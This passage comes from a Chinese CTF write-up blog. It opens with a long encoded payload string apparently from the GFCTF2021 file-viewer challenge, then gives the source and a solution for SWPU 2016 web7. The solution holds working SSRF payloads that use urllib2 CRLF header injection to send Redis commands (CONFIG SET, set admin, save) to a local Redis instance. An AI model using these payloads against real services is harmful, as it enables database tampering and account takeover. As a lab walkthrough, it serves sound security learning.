<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">=<span class="hljs-number">00</span>R=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>D=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>X=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>X=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>V=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>K=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>k=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>D=<span class="hljs-number">008</span>=<span class="hljs-number">00</span>+=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>q=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>E=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>A=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>g=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>u=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>W=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>c=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>k=<span class="hljs-number">001</span>=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>b=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>e=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>L=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>q=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>Y=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>N=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>b=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>v=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>E=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>p=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>Z=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>e=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>m=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>y=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>t=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>c=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>m=<span class="hljs-number">001</span>=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>c=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>Z=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>l=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>M=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>j=<span class="hljs-number">00</span>I=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>e=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>l=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>W=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>U=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">004</span>=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>Y=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>F=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>I=<span class="hljs-number">00</span>C=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>K=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>D=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>V=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>I=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>c=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>o=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>z=<span class="hljs-number">00</span>e=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>W=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>M=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>Y=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>l=<span class="hljs-number">00</span>Y=<span class="hljs-number">002</span>=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>i=<span class="hljs-number">00</span>O=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>a=<span class="hljs-number">00</span>T=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>O=<span class="hljs-number">000</span>=<span class="hljs-number">004</span>=<span class="hljs-number">007</span>=<span class="hljs-number">00</span>f=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>B=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>n=<span class="hljs-number">00</span>R=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>d=<span class="hljs-number">00</span>A=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>L=<span class="hljs-number">001</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>R=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>w=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>v=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>o=<span class="hljs-number">00S</span>=<span class="hljs-number">00</span>C=<span class="hljs-number">002</span>=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>G=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>h=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>W=<span class="hljs-number">00</span>F=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>Z=<span class="hljs-number">00</span>X=<span class="hljs-number">00</span>N=<span class="hljs-number">000</span>=<span class="hljs-number">006</span>=<span class="hljs-number">00</span>O=<span class="hljs-number">00</span>q=<span class="hljs-number">00</span>P=<span class="hljs-number">00</span>c=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>H=<span class="hljs-number">00</span>F=<span class="hljs-number">00</span>K=<span class="hljs-number">009</span>=<span class="hljs-number">00</span>m=<span class="hljs-number">00</span>B=<span class="hljs-number">003</span>=<span class="hljs-number">00</span>b=<span class="hljs-number">00</span>p=<span class="hljs-number">00</span>Q=<span class="hljs-number">00s</span>=<span class="hljs-number">00</span>r=<span class="hljs-number">005</span>=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>y=<span class="hljs-number">004</span>=<span class="hljs-number">00</span>x=<span class="hljs-number">00</span>o=<span class="hljs-number">00</span>L=<span class="hljs-number">00</span>Y=<span class="hljs-number">00</span>C=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>A=<span class="hljs-number">00</span>R=<span class="hljs-number">000</span>=<span class="hljs-number">00</span>J=<span class="hljs-number">00</span>N=<span class="hljs-number">00</span>Q=<span class="hljs-number">00</span>g=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D=<span class="hljs-number">00</span>=<span class="hljs-number">3</span>D<br></code></pre></td></tr></tbody></table></figure>
<h2 id="参考文章-3">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42585535/article/details/130838709">[GFCTF2021]文件查看器复现</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/134955296">[GFCTF 2021]文件查看器</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aninock/p/16612452.html">GFCTF 2021]文件查看器</a></p>
<h1>[SWPU 2016]web7</h1>
<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python </span><br><span class="hljs-comment"># coding:utf8</span><br><br>__author__ = <span class="hljs-string">'niexinming'</span><br><br><span class="hljs-keyword">import</span> cherrypy<br><span class="hljs-keyword">import</span> urllib2<br><span class="hljs-keyword">import</span> redis<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">web7</span>:<br><span class="hljs-meta">    @cherrypy.expose</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"&lt;script&gt; window.location.href='/input';&lt;/script&gt;"</span><br><span class="hljs-meta">    @cherrypy.expose</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">input</span>(<span class="hljs-params">self,url=<span class="hljs-string">""</span>,submit=<span class="hljs-string">""</span></span>):<br>        file=<span class="hljs-built_in">open</span>(<span class="hljs-string">"index.html"</span>,<span class="hljs-string">"r"</span>).read()<br>        reheaders=<span class="hljs-string">""</span><br>        <span class="hljs-keyword">if</span> cherrypy.request.method==<span class="hljs-string">"GET"</span>:<br>            reheaders=<span class="hljs-string">""</span><br>        <span class="hljs-keyword">else</span>:<br>            url=cherrypy.request.params[<span class="hljs-string">"url"</span>]<br>            submit=cherrypy.request.params[<span class="hljs-string">"submit"</span>]<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> urllib2.urlopen(url).info().headers:<br>                    reheaders=reheaders+x+<span class="hljs-string">"&lt;br&gt;"</span><br>            <span class="hljs-keyword">except</span> Exception,e:<br>                reheaders=<span class="hljs-string">"错误"</span>+<span class="hljs-built_in">str</span>(e)<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> urllib2.urlopen(url).info().headers:<br>                reheaders=reheaders+x+<span class="hljs-string">"&lt;br&gt;"</span><br>        file=file.replace(<span class="hljs-string">"&lt;?response?&gt;"</span>,reheaders)<br>        <span class="hljs-keyword">return</span> file<br><span class="hljs-meta">    @cherrypy.expose</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self,password=<span class="hljs-string">""</span>,submit=<span class="hljs-string">""</span></span>):<br>        pool = redis.ConnectionPool(host=<span class="hljs-string">'127.0.0.1'</span>, port=<span class="hljs-number">6379</span>)<br>        r = redis.Redis(connection_pool=pool)<br>        re=<span class="hljs-string">""</span><br>        file=<span class="hljs-built_in">open</span>(<span class="hljs-string">"login.html"</span>,<span class="hljs-string">"r"</span>).read()<br>        <span class="hljs-keyword">if</span> cherrypy.request.method==<span class="hljs-string">"GET"</span>:<br>            re=<span class="hljs-string">""</span><br>        <span class="hljs-keyword">else</span>:<br>            password=cherrypy.request.params[<span class="hljs-string">"password"</span>]<br>            submit=cherrypy.request.params[<span class="hljs-string">"submit"</span>]<br>            <span class="hljs-keyword">if</span> r.get(<span class="hljs-string">"admin"</span>)==password:<br>                re=<span class="hljs-built_in">open</span>(<span class="hljs-string">"flag"</span>,<span class="hljs-string">'r'</span>).readline()<br>            <span class="hljs-keyword">else</span>:<br>                re=<span class="hljs-string">"Can't find admin:"</span>+password+<span class="hljs-string">",fast fast fast....."</span><br>        file=file.replace(<span class="hljs-string">"&lt;?response?&gt;"</span>,re)<br>        <span class="hljs-keyword">return</span> file<br>cherrypy.config.update({<span class="hljs-string">'server.socket_host'</span>: <span class="hljs-string">'0.0.0.0'</span>,<br>                        <span class="hljs-string">'server.socket_port'</span>: <span class="hljs-number">8080</span>,<br>                       })<br>cherrypy.quickstart(web7(),<span class="hljs-string">'/'</span>)<br></code></pre></td></tr></tbody></table></figure>
<p>代码逻辑也不难理解，首先是对input页面的处理他会提取到输入框中的url参数内容，接着调用urllib2模块打开url，获取响应的头部信息，并返回页面中。</p>
<p>其次是对login页面的处理，他获取输入框中的password参数内容，接着连接redis数据库，将该数据库中admin键所对应的值与password内容比较，如果相等，则回显flag。</p>
<p>也就是说，我们需要想办法获取到redis中admin的值。这里我当时还以为用ssrf常规打redis的思路，直接gopher协议干，但试下来没啥效果，似乎只能以http来开头。随后看了wp发现不在自己知识存储范围内：</p>
<p>这道题对我来说依旧是新知识：python的urllib2的http头部注入</p>
<p>我们以redis数据库为例，当存在SSRF时我们伪造以下请求</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1%</span><span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">20S</span>ET%<span class="hljs-number">20</span>dir%<span class="hljs-number">20%</span><span class="hljs-number">2</span>ftmp%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aCONFIG%<span class="hljs-number">20S</span>ET%<span class="hljs-number">20</span>dbfilename%<span class="hljs-number">20</span>evil%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a:<span class="hljs-number">6379</span>/foo<br></code></pre></td></tr></tbody></table></figure>
<p>解码一下，执行过程就是将修改Redis的工作目录为 <code>/tmp</code>，然后修改Redis的数据库文件名为 evil，路径为默认端口的<code>/foo</code></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>CONFIG SET dir /tmp<br>CONFIG SET dbfilename evil<br>:<span class="hljs-number">6379</span>/foo<br></code></pre></td></tr></tbody></table></figure>
<p>然后就可以执行相关操作，比如修改用户的密码。再次利用ssrf漏洞进行修改并保存</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1%</span><span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">20</span>admin%<span class="hljs-number">20</span>admin%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a:<span class="hljs-number">6379</span>/foo<br></code></pre></td></tr></tbody></table></figure>
<p>解码结果如下</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>set admin admin<br>save<br>:<span class="hljs-number">6379</span>/foo<br></code></pre></td></tr></tbody></table></figure>
<p>有了上面的知识，我们直接修改redis数据库的密码就行了</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1%</span><span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">20</span>admin%<span class="hljs-number">20</span>admin%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a:<span class="hljs-number">6379</span>/foo<br>//这里建议一直点击发送，然后发送完，赶紧输入admin密码登录<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315103831829.png" alt="image-20240315103831829"></p>
<p>具体漏洞原理，我认为可参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12387?time__1311=mqmhD57KAKGIzDBqDTeeqBKMjhvdPwqx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">CRLF injection</a></p>
